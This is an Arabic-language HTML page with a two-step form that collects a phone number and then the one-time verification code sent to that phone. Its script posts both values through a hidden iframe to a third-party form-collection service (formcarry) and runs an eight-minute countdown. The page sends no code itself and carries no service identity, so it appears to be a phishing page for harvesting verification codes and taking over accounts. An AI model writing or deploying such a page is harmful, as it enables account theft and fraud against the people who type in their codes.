<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>نموذج رقم الهاتف والكود</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }
    .container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
      padding: 30px 40px;
      width: 100%;
      max-width: 420px;
      box-sizing: border-box;
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
      font-weight: 700;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #555;
    }
    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 8px;
      border: 1.8px solid #ccc;
      margin-bottom: 20px;
      transition: border-color 0.3s ease;
      font-family: inherit;
      box-sizing: border-box;
    }
    input:focus {
      border-color: #28a745;
      outline: none;
    }
    button {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      background-color: #28a745;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      font-weight: 700;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }
    button:hover:not(:disabled) {
      background-color: #218838;
    }
    button:disabled {
      background-color: #94d3a2;
      cursor: not-allowed;
    }
    #timer {
      text-align: center;
      font-weight: 600;
      color: #666;
      margin-bottom: 20px;
      min-height: 24px;
    }
    #codeField {
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>نموذج رقم الهاتف والكود</h2>

    <form id="phoneForm" onsubmit="return sendPhone(event);">
      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" autocomplete="tel" />
      <button type="submit" id="sendPhoneBtn">إرسال رقم الهاتف</button>
      <div id="timer"></div>
    </form>

    <form id="codeForm" onsubmit="return sendCode(event);">
      <div id="codeField">
        <label for="code">الكود المرسل إليك:</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
        <button type="submit" id="sendCodeBtn">إرسال الكود</button>
      </div>
    </form>
  </div>

  <!-- iframe مخفي لاستقبال الإرسال -->
  <iframe name="hidden_iframe" style="display:none;" onload="onCodeSent()"></iframe>

  <script>
    let countdownInterval;
    let codeSent = false;

    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
    const timerDisplay = document.getElementById('timer');
    const codeField = document.getElementById('codeField');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');

    function startTimer(duration) {
      let timeLeft = duration;
      timerDisplay.style.display = 'block';
      updateTimer(timeLeft);
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendPhoneBtn.disabled = false;
        }
      }, 1000);
    }

    function updateTimer(seconds) {
      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
      const secs = (seconds % 60).toString().padStart(2, '0');
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
    }

    function sendPhone(event) {
      event.preventDefault();

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return false;
      }

      // إرسال رقم الهاتف فقط مع كود فارغ
      const tempForm = document.createElement('form');
      tempForm.action = "https://formcarry.com/s/gv93b8b6cht";
      tempForm.method = "POST";
      tempForm.target = "hidden_iframe";
      tempForm.style.display = "none";

      const phoneField = document.createElement('input');
      phoneField.name = 'phone';
      phoneField.value = phoneInput.value;
      tempForm.appendChild(phoneField);

      const emptyCode = document.createElement('input');
      emptyCode.name = 'code';
      emptyCode.value = '';
      tempForm.appendChild(emptyCode);

      document.body.appendChild(tempForm);
      tempForm.submit();

      codeField.style.display = 'block';
      sendPhoneBtn.disabled = true;
      startTimer(480); // 8 دقائق

      return false;
    }

    function sendCode(event) {
      event.preventDefault();

      if (codeInput.value.trim() === '') {
        alert('يرجى كتابة الكود المرسل إليك.');
        codeInput.focus();
        return false;
      }

      codeSent = true;

      const tempForm = document.createElement('form');
      tempForm.action = "https://formcarry.com/s/gv93b8b6cht";
      tempForm.method = "POST";
      tempForm.target = "hidden_iframe";
      tempForm.style.display = "none";

      const phoneField = document.createElement('input');
      phoneField.name = 'phone';
      phoneField.value = phoneInput.value;
      tempForm.appendChild(phoneField);

      const codeFieldInput = document.createElement('input');
      codeFieldInput.name = 'code';
      codeFieldInput.value = codeInput.value;
      tempForm.appendChild(codeFieldInput);

      document.body.appendChild(tempForm);
      tempForm.submit();

      return false;
    }

    // عند تحميل iframe بعد الإرسال
    function onCodeSent() {
      if (codeSent) {
        window.location.href = 'success.html';
      }
    }
  </script>

</body>
</html>
